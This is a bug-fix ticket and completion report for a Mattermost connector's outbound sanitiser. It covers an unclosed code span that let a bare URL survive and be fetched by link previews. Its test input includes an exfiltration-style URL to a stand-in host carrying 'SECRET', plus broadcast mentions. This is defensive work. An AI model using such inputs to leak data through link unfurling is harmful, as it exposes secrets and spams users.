# FIX-182: The Mattermost outbound pipeline can leave a live bare URL (an inline code span crossing a block boundary)

## Goal
Security-relevant (D-270 link previews / data exfiltration; FIX-142's outbound pipeline). Found by the CI
Watcher (2026-11-19) in CI run 44535701452, shard rust-test 3:
`connectors/mattermost/tests/hostile_pipeline.rs:343`
`hostile_text_reaches_mattermost_without_images_bad_links_or_code_broadcasts` → "a bare URL is left (the
server would fetch it)". Minimal input:

```
<div>
![x](https://e.example/?d=S)
</div> <code> see https://e.example/?d=SECRET now > [!NOTE]
> n <code>@channel</code> <kbd>@all</kbd> <pre>@here</pre>
```

Output: `\!\[x\]\(…\)\n\n ` see https://e.example/?d=SECRET now > [!NOTE]\n> n @​channel` `@​all` …`.
Cause (CI Watcher's reading, confirm it): the unclosed `<code>` becomes a backtick span meant to cover
the URL, but the next line starts with `> `, which ends the paragraph (a blockquote), so the span never
closes and the URL is plain text the Mattermost server unfurls — an agent-controlled URL with data in its
query fetched by the server.

Proptest seed `cc 02af42e08582e5bf29b382e7fc82c98233a4c79d548c2021b8b480c154b35712` for
`connectors/mattermost/tests/hostile_pipeline.proptest-regressions` — commit it **with** the fix (it fails
CI at random until then).

## Change
An inline code span never spans a block boundary: close it before any line break that could start a new
block (or escape/break the URL inside it as D-270 does for URLs outside code), and make the bare-URL
neutralisation run on whatever is not inside a *closed* span. Prefer the fix that keeps D-270's invariant
independent of how a span ends: "no bare `http(s)://` survives outside a closed code span". Check the
other block starters (`#`, `-`, `*`, `1.`, `|`, fences, setext underlines, `>`) and the other connectors
that share the pipeline (`aurora-channels`), not only `>`. Never weaken a check to make the property pass.

## Completion report

**Cause (confirmed).** `connectors/mattermost/src/convert.rs`: an HTML `<code>`/`<kbd>`/`<pre>` pair (in
`Html::convert`, and the inline-HTML path of `convert`) became one backtick span around the text between
the tags, **line breaks included**. With a block starter after a line break (`> `, `- `, …) the Markdown
parser ends the paragraph first (block structure beats inline spans), so the span never closes and the URL
that was inside it is plain text — fetched by the server's link preview (D-270). Not in `aurora-channels` or
`sanitize` (they write `[url](url)`, and the span is made after that).

**Fix.** `code_span` (the one function all three span builders use: the HTML pair in a block, the inline
pair, the footnote's indented continuation) now writes the span on **one line**: `\r`/`\n` in its text become
spaces (CommonMark reads a line break in a span as a space, so what a reader sees is the same). Also found by
the 20 000-case run (a different input, a pre-existing hole, seed committed): the label of an `<a href>` was
converted as a document, so four leading spaces made an indented code block that kept raw
`<a href="https://…">` text (a bare URL) in the link label. The label's lines are now left-trimmed before
its conversion.

**Why no fetchable URL can survive.** (1) A span has no line break, so nothing can sit between its opening and
closing backticks that ends the paragraph — a block starter is only recognised at the start of a line, and the
span lives inside one line; the span is closed on the line it opens on, whatever the block starter is (`>`,
`#`, `-`/`*`/`+`, `1.`, `|`, fences, setext, `$$`, `[r]:` …: tested as a table with all three tags and `\n`,
blank-line and `\r\n` separators). (2) Its delimiter is longer than any backtick run inside it, so the text
cannot close it early. (3) Unpaired tags make no span at all (dropped), so there is no opened-but-unclosed
span; `<pre>` as a block is a fence longer than any run in it, starting on its own line, closed by its own
line. (4) The last line, `is_safe`/`has_bare_url`, is unchanged and still checks every output; the property
test (`hostile_text_…`, whose seed is now a committed regression) states D-270's invariant independent of how a
span ends and passed 20 000 cases (release) after the fix. Nothing was weakened.

**Tests.** `hostile_pipeline.rs::a_code_pair_across_a_block_boundary_leaves_no_bare_url` (both CI Watcher cases —
blockquote and list item, the latter also asserting the broken mentions stay broken — plus 22 block starters ×
3 tags × 3 separators, plus "an ordinary closed span is unchanged"); `convert.rs` unit assertion for the
one-line span; `hostile_pipeline.proptest-regressions` (the CI seed `02af42e0…` and the label seed `0d813d5a…`).
Seen failing first: the seed case and the minimal case failed (`a bare URL is left`) before the fix, in the new test
and in the proptest. The list-item case was added after the fix and not run against the old code.
